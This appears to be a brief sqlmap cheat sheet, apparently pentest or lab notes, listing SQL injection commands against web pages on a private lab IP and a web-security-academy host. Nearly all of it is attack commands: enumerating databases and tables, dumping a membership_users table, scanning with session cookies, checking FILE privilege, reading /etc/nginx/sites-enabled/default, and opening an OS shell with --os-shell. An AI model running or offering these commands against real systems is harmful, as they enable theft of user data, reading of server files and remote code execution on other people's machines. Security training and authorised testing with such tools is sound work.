---

---

---
#### Without Network Package

```
sqlmap -u http://172.16.1.12/blog/category.php?id=1 --dbs --batch
```

#### With Network Package

Enumerating Databases

```
sqlmap -r sql.req --batch -dbs
```

Enumerated Tables

```
sqlmap -r sql.req --batch -D db_admins --tables
```

Dumped Table

```
sqlmap -r sql.req --batch -D db_admins -T membership_users --dump
```

Authenticated

```
sqlmap -u "https://kek.web-security-academy.net/advanced_search?query_search?query-kek+&sort-by-AUTHOR*&logArtist-" --cookie- "_ddwqdsasdsagfgbhtehgterfefwedffewefwfewewf; session=dwqdwqbfhfuzuzuuuu" -dbs --level 5 --risk 3
```

#### Enumerate Privileges

```
sqlmap -r sql.req --privileges
[*] remo [1]:
    privilege: FILE
```

FILE = Allows File Read
#### Fileread with sqlmap

```
sqlmap -r sql.req --risk 3 --level 5 --technique=BEU --batch --file-read=/etc/nginx/sites-enabled/default
```

Output will get stored inside an file.
#### RCE with sqlmap

```
sqlmap -r sql.req --os-shell --batch
```